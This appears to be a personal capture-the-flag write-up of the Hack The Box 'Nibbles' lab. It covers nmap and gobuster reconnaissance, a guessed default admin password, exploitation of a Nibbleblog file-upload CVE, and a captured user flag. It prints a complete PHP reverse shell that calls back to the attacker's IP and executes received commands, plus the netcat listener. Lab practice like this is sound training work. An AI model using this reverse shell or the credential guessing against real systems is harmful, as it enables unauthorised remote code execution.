#easy 

## 0. **Lab infos**

**Difficulty :** Easy
**Name :** Nibbles
**IP** : 10.129.96.84
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 
	**Start :** 21.04.2025 / 18:13
	**Break at/to :** 
	**Finish :** 
**Satisfaction :**  
### 1. **Reconnaissance

We start with an #nmap scan :

```BASH
nmap -A 10.129.96.84

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

![[Pasted image 20250421181609.png]]

On the inspector we have a comment who says /nibbleblog/

![[Pasted image 20250421181955.png]]

We make a gobuster scan :

```BASH
─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-3oaajlzaes]─[~]
└──╼ [★]$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.96.84/nibbleblog/ -x html,php,db,txt,js,log,config,py,bdd
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.84/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,db,txt,html,log,config,py,bdd,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 303]
/.php                 (Status: 403) [Size: 302]
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 302]
/admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]
/LICENSE.txt          (Status: 200) [Size: 35148]
```

![[Pasted image 20250421183007.png]]

![[Pasted image 20250421183246.png]]

On the admin.php page we try admin:nibbles and it's work.

We find a CVE (2015-6967) so let's try
## 2. **Weaponization

with #Metasploit 

```BASH
set RHOSTS 10.129.96.84
set TARGETURI /nibbleblog/
set USERNAME admin
set PASSWORD nibbles
```

But it's telling us to try manualy.

SO we create image.php

```PHP
<?php
// Réverse shell PHP minimal
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.117';  // votre IP d'écoute
$port = 4444;  // votre port d'écoute
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// ouverture du socket
if (!function_exists('stream_set_blocking')) {
    die("stream_set_blocking() manquante");
}
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("$errstr ($errno)");
}

// redirection des descripteurs
$fds = array($sock, STDIN, STDOUT, STDERR);
stream_set_blocking($sock, false);
stream_set_blocking(STDIN, false);

// boucle principale
while (1) {
    // lecture depuis le socket
    if (feof($sock)) break;
    $read = array($sock);
    $num_changed_streams = stream_select($read, $write_a, $error_a, null);

    if (in_array($sock, $read)) {
        $input = fgets($sock, $chunk_size);
        if (!$input) break;
        // exécution de la commande et renvoi du résultat
        $output = shell_exec($input);
        fwrite($sock, $output);
    }
}
fclose($sock);
?>
```

## 3. **Delivery

![[Pasted image 20250421185409.png]]

## 4. **Exploitation

```BASH
┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-3oaajlzaes]─[~]
└──╼ [★]$ nc -lvnp 4444
```

And once we go to : 
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php

we have our #RCE 

## 5. **Installation

## 6. **Command and Control

## 7. **Actions on Objectives

```BASH
ls /home/nibbler
personal.zip
user.txt
cat /home/nibbler/user.txt           
52e5f38017a66a6418f66d0036540450
```